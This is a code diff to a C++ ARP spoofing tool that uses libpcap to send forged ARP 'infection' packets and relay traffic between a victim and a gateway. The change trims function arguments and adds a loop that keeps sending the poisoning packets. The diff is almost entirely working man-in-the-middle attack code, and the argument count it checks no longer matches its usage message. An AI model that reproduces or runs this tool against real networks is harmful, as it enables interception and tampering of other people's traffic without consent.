@@ -80,9 +80,9 @@ using namespace std;
 
  }
 
- int arp_infection_packet(char arga[], char argb[], char argc[], char argd[], char arge[], pcap_t *pcd) {
+ int arp_infection_packet(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd) {
 
-     change_mac(arge, eth_arp_hdr->h_dest); // Ethernet Destination
+     change_mac(argd, eth_arp_hdr->h_dest); // Ethernet Destination
      for(int i=0; i<6; i++) { // Ethernet Source
          eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
      }
@@ -97,7 +97,7 @@ using namespace std;
 
      put_ip(argb, eth_arp_hdr->__ar_sip); // Sender ip
      get_my_mac(arga, eth_arp_hdr->__ar_sha); // Sender mac
-     change_mac(arge, eth_arp_hdr->__ar_tha); // Target mac
+     change_mac(argd, eth_arp_hdr->__ar_tha); // Target mac
      put_ip(argc, eth_arp_hdr->__ar_tip); // Target ip
 
      if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
@@ -107,8 +107,8 @@ using namespace std;
      else cout << endl << endl << "Send infaction packet" << endl;
  }
 
- int arp_request(char arga[], char argb[], char argc[], char argd[], char arge[], pcap_t *pcd) {
-     
+ int arp_request(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd) {
+
     // Attacker -> Target
      memset(eth_arp_hdr->h_dest, 0xff, 6);// Request Ethernet Destination
      get_my_mac(arga, eth_arp_hdr->h_source); // Request Ethernet Source
@@ -133,7 +133,7 @@ using namespace std;
  }
 
 
- int relay_ip_packet(char arga[], char argb[], char argc[], char argd[], char arge[], pcap_t *pcd, unsigned char *packet) {
+ int relay_ip_packet(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd, unsigned char *packet) {
 
      // Attacker -> Target
      memcpy(eth_arp_hdr->h_dest, packet, sizeof(eth_arp_hdr->h_dest)); // Destination = gateway mac address
@@ -146,7 +146,7 @@ using namespace std;
      eth_arp_hdr->ar_pln = 0x04;
 
      put_ip(argc, eth_arp_hdr->__ar_sip); // Sender ip = Victim ip
-     change_mac(arge, eth_arp_hdr->__ar_sha); // Sender mac = My mac
+     change_mac(argd, eth_arp_hdr->__ar_sha); // Sender mac = My mac
 
      memcpy(eth_arp_hdr->__ar_tha, packet, sizeof(eth_arp_hdr->__ar_tha)); // Target mac = broadcast
      put_ip(argb, eth_arp_hdr->__ar_tip); // Target ip = gateway ip
@@ -162,7 +162,7 @@ using namespace std;
 
 int main(int argc, char *argv[])
 {
-    if (argc != 7) {
+    if (argc != 5) {
         cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac ip_network_address";
         return -1;
     }
@@ -184,24 +184,25 @@ int main(int argc, char *argv[])
     int res;
 
     while(1) {
-
-        arp_request(argv[1], argv[2], argv[3], argv[4], argv[5], pcd);
+        
+        arp_infection_packet(argv[1], argv[2], argv[3], argv[4], pcd);
+        arp_request(argv[1], argv[2], argv[3], argv[4], pcd);
 
         while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) { // ethernet packet
-    
+
             sleep(1);
-    
+
             if(res == 0) continue;
             if(res < 0) {
                 cout << "Error reading the packets" << pcap_geterr(pcd);
                 return -1;
             }
-    
+
             ep = (struct ethhdr*)packet;
-    
+
             if(htons(ep->h_proto) == ETHERTYPE_ARP) {
                 sleep(1);
-                relay_ip_packet(argv[1], argv[2], argv[3], argv[4], argv[5], pcd, ep->h_source);
+                relay_ip_packet(argv[1], argv[2], argv[3], argv[4], pcd, ep->h_source);
               //  arp_infection_packet(argv[1], argv[2], argv[3], argv[4], argv[5], pcd);
                 // here, infection packet need if
                 break;
